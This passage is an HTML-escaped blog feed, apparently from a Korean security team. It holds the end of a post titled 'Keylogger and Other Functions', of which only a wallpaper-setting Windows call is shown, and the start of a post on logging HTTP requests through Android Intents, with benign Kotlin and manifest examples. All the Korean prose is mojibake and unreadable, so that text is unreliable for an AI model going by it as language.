&lt;span class=&quot;n&quot;&gt;ctypes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;windll&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SystemParametersInfoA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SPI_SETDESKWALLPAPER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;image_Path&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;3ê°œ ê¸°ëŠ¥ ëª¨ë‘ Windows í™”ë©´ì œì–´ì— ê´€í•œ ê¸°ëŠ¥ì„ ìˆ˜í–‰í•©ë‹ˆë‹¤.&lt;/p&gt;
</description>
        <pubDate>Wed, 01 Jul 2020 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/2020-07-01/Keylogger-and-Other-Functions</link>
        <guid isPermaLink="true">http://localhost:4000/2020-07-01/Keylogger-and-Other-Functions</guid>
        
        <category>programming</category>
        
        <category>etc</category>
        
        
      </item>
    
      <item>
        <title>Intentë¥¼ í™œìš©í•œ ì™¸ë¶€ ìš”ì²­ì— ëŒ€í•œ íŒ¨í‚· ë¡œê¹…</title>
        <description>&lt;p&gt;ë¼ì˜¨í™”ì´íŠ¸í–‡ í•µì‹¬ì—°êµ¬íŒ€ ì›ìš”í•œ&lt;/p&gt;

&lt;p&gt;ì´ ë¬¸ì„œëŠ” Intentë¥¼ í™œìš©í•˜ì—¬ Activity ì „í™˜ ì‹œ, ìš”ì²­í•˜ëŠ” ì™¸ë¶€ HTTP ìš”ì²­ì„ ì–»ê¸° ìœ„í•œ ì•„ì´ë””ì–´ ë° êµ¬í˜„ ë°©ë²•, í•œê³„ì ì— ëŒ€í•´ì„œ ì‘ì„±ë˜ì—ˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;h2 id=&quot;intent&quot;&gt;Intent&lt;/h2&gt;

&lt;p&gt;Intentë€ Androidì—ì„œ í”íˆ ìŠ¤í¬ë¦°ì´ë¼ê³  í•˜ëŠ” Activityê°„ ì „í™˜ì„ ìœ„í•´ì„œ ì‚¬ìš©ë˜ëŠ” ê°ì²´ì…ë‹ˆë‹¤. í•´ë‹¹ ê°ì²´ë¥¼ í†µí•´ &lt;code class=&quot;highlighter-rouge&quot;&gt;ì–´ë–¤ Activityë¡œ ì „í™˜í• ì§€&lt;/code&gt; , ì „í™˜ì‹œ &lt;code class=&quot;highlighter-rouge&quot;&gt;ì „ë‹¬í•  ë°ì´í„°ë¥¼ ì €ì¥&lt;/code&gt; í•˜ê²Œ ë©ë‹ˆë‹¤. ì‚¬ìš©ë°©ë²•ì€ ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-kotlin highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;kuroneko.com.sampleapp&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;android.content.Intent&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;android.support.v7.app.AppCompatActivity&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;android.os.Bundle&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;android.widget.Button&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;MainActivity&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;AppCompatActivity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;override&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;fun&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;onCreate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;savedInstanceState&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Bundle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;?)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;super&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;onCreate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;savedInstanceState&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;nf&quot;&gt;setContentView&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;layout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;activity_main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

        &lt;span class=&quot;kd&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;py&quot;&gt;button&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Button&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;findViewById&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;button2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;button&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;setOnClickListener&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;kd&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;py&quot;&gt;intent&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Intent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ActivityTwo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;apply&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
								&lt;span class=&quot;nf&quot;&gt;putExtra&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;some&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;thing&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
						&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
		        &lt;span class=&quot;nf&quot;&gt;startActivity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;intent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-kotlin highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;kuroneko.com.sampleapp&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;android.support.v7.app.AppCompatActivity&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;android.os.Bundle&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ActivityTwo&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;AppCompatActivity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;override&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;fun&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;onCreate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;savedInstanceState&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Bundle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;?)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;super&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;onCreate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;savedInstanceState&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;nf&quot;&gt;setContentView&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;layout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;activity_two&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

				&lt;span class=&quot;kd&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;py&quot;&gt;message&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;intent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;getStringExtra&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;some&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
				&lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// print -&amp;gt; thing&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Intentì˜ ì²«ë²ˆì§¸ ì¸ìë¡œ í˜„ì¬ contextì™€ ë‘ ë²ˆì§¸ ì¸ìë¡œ ì´ë™í•  í´ë˜ìŠ¤ë¥¼ ì§€ì •í•œ ì´í›„, startActivity í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•´ ì§€ì •ëœ Activityë¡œ ì´ë™í•˜ê²Œ ë©ë‹ˆë‹¤. ë”°ë¼ì„œ, ë°ì´í„°ë¥¼ ì „ë‹¬í•˜ë©° ì—¬ëŸ¬ê°€ì§€ ì‘ì—…ë“¤ì„ í™”ë©´ì „í™˜í•˜ë©° ì²˜ë¦¬í•  ìˆ˜ ìˆê²Œ ë˜ì—ˆìŠµë‹ˆë‹¤. ë˜í•œ, ëª¨ë“  Activityë“¤ì€ ì•„ë˜ì™€ ê°™ì´ AndroidManifest.xmlì—ì„œ ì •ì˜ë˜ì–´ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;manifest&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;xmlns:android=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://schemas.android.com/apk/res/android&quot;&lt;/span&gt;
          &lt;span class=&quot;na&quot;&gt;package=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;kuroneko.com.sampleapp&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;

    &lt;span class=&quot;nt&quot;&gt;&amp;lt;application&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;android:allowBackup=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;true&quot;&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;android:icon=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;@mipmap/ic_launcher&quot;&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;android:label=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;@string/app_name&quot;&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;android:roundIcon=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;@mipmap/ic_launcher_round&quot;&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;android:supportsRtl=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;true&quot;&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;android:theme=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;@style/AppTheme&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;activity&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;android:name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;.MainActivity&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;&amp;lt;intent-filter&amp;gt;&lt;/span&gt;
                &lt;span class=&quot;nt&quot;&gt;&amp;lt;action&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;android:name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;android.intent.action.MAIN&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;

                &lt;span class=&quot;nt&quot;&gt;&amp;lt;category&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;android:name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;android.intent.category.LAUNCHER&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;&amp;lt;/intent-filter&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;/activity&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;activity&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;android:name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;.ActivityTwo&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;/activity&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/application&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;/manifest&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;activity tagë¥¼ ì‚´í´ë³´ê²Œ ë˜ë©´, intent-filterë¥¼ childrenìœ¼ë¡œ ê°€ì§€ê²Œ ë˜ë©° intentë¥¼ ì²˜ë¦¬í•  ë•Œ ì–´ë–¤ ë°©ì‹ìœ¼ë¡œ ì²˜ë¦¬í• ì§€ ì •ì˜í•˜ê²Œ ë©ë‹ˆë‹¤. ë˜í•œ, ì–´ë–¤ &lt;a href=&quot;https://developer.android.com/guide/topics/manifest/activity-element?hl=ko&quot;&gt;attribute&lt;/a&gt;ë¥¼ ê°€ì§ˆ ìˆ˜ ìˆëŠ”ì§€ êµ¬ê¸€ë§ì„ í†µí•´ ì°¾ì•„ë³´ì•˜ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;activity&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;android:allowEmbedded=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[&quot;true&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;false&quot;]&lt;/span&gt;
          &lt;span class=&quot;na&quot;&gt;android:allowTaskReparenting=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[&quot;true&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;false&quot;]&lt;/span&gt;
          &lt;span class=&quot;na&quot;&gt;android:alwaysRetainTaskState=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[&quot;true&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;false&quot;]&lt;/span&gt;
          &lt;span class=&quot;na&quot;&gt;android:autoRemoveFromRecents=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[&quot;true&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;false&quot;]&lt;/span&gt;
          &lt;span class=&quot;na&quot;&gt;android:banner=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;drawable resource&quot;&lt;/span&gt;
          &lt;span class=&quot;na&quot;&gt;android:clearTaskOnLaunch=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[&quot;true&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;false&quot;]&lt;/span&gt;
          &lt;span class=&quot;na&quot;&gt;android:colorMode=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;hdr&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;wideColorGamut&quot;]&lt;/span&gt;
          &lt;span class=&quot;na&quot;&gt;android:configChanges=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[&quot;mcc&quot;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;mnc&quot;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;locale&quot;,&lt;/span&gt;
                                 &lt;span class=&quot;err&quot;&gt;&quot;touchscreen&quot;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;keyboard&quot;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;keyboardHidden&quot;,&lt;/span&gt;
                                 &lt;span class=&quot;err&quot;&gt;&quot;navigation&quot;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;screenLayout&quot;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;fontScale&quot;,&lt;/span&gt;
                                 &lt;span class=&quot;err&quot;&gt;&quot;uiMode&quot;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;orientation&quot;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;density&quot;,&lt;/span&gt;
                                 &lt;span class=&quot;err&quot;&gt;&quot;screenSize&quot;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;smallestScreenSize&quot;]&lt;/span&gt;
          &lt;span class=&quot;na&quot;&gt;android:directBootAware=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[&quot;true&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;false&quot;]&lt;/span&gt;
          &lt;span class=&quot;na&quot;&gt;android:documentLaunchMode=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[&quot;intoExisting&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;always&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;
                                  &lt;span class=&quot;err&quot;&gt;&quot;none&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;never&quot;]&lt;/span&gt;
          &lt;span class=&quot;na&quot;&gt;android:enabled=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[&quot;true&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;false&quot;]&lt;/span&gt;
          &lt;span class=&quot;na&quot;&gt;android:excludeFromRecents=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[&quot;true&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;false&quot;]&lt;/span&gt;
          &lt;span class=&quot;na&quot;&gt;android:exported=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[&quot;true&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;false&quot;]&lt;/span&gt;
          &lt;span class=&quot;na&quot;&gt;android:finishOnTaskLaunch=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[&quot;true&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;false&quot;]&lt;/span&gt;
          &lt;span class=&quot;na&quot;&gt;android:hardwareAccelerated=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[&quot;true&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;false&quot;]&lt;/span&gt;
          &lt;span class=&quot;na&quot;&gt;android:icon=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;drawable resource&quot;&lt;/span&gt;
          &lt;span class=&quot;na&quot;&gt;android:immersive=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[&quot;true&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;false&quot;]&lt;/span&gt;
          &lt;span class=&quot;na&quot;&gt;android:label=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;string resource&quot;&lt;/span&gt;
          &lt;span class=&quot;na&quot;&gt;android:launchMode=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[&quot;standard&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;singleTop&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;
                              &lt;span class=&quot;err&quot;&gt;&quot;singleTask&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;singleInstance&quot;]&lt;/span&gt;
          &lt;span class=&quot;na&quot;&gt;android:lockTaskMode=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[&quot;normal&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;never&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;
                              &lt;span class=&quot;err&quot;&gt;&quot;if_whitelisted&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;always&quot;]&lt;/span&gt;
          &lt;span class=&quot;na&quot;&gt;android:maxRecents=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;integer&quot;&lt;/span&gt;
          &lt;span class=&quot;na&quot;&gt;android:maxAspectRatio=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;float&quot;&lt;/span&gt;
          &lt;span class=&quot;na&quot;&gt;android:multiprocess=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[&quot;true&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;false&quot;]&lt;/span&gt;
          &lt;span class=&quot;na&quot;&gt;android:name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;string&quot;&lt;/span&gt;
          &lt;span class=&quot;na&quot;&gt;android:noHistory=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[&quot;true&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;false&quot;]&lt;/span&gt;  
          &lt;span class=&quot;na&quot;&gt;android:parentActivityName=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;string&quot;&lt;/span&gt; 
          &lt;span class=&quot;na&quot;&gt;android:persistableMode=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[&quot;persistRootOnly&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt; 
                                   &lt;span class=&quot;err&quot;&gt;&quot;persistAcrossReboots&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;persistNever&quot;]&lt;/span&gt;
          &lt;span class=&quot;na&quot;&gt;android:permission=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;string&quot;&lt;/span&gt;
          &lt;span class=&quot;na&quot;&gt;android:process=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;string&quot;&lt;/span&gt;
          &lt;span class=&quot;na&quot;&gt;android:relinquishTaskIdentity=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[&quot;true&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;false&quot;]&lt;/span&gt;
          &lt;span class=&quot;na&quot;&gt;android:resizeableActivity=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[&quot;true&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;false&quot;]&lt;/span&gt;
          &lt;span class=&quot;na&quot;&gt;android:screenOrientation=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[&quot;unspecified&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;behind&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;
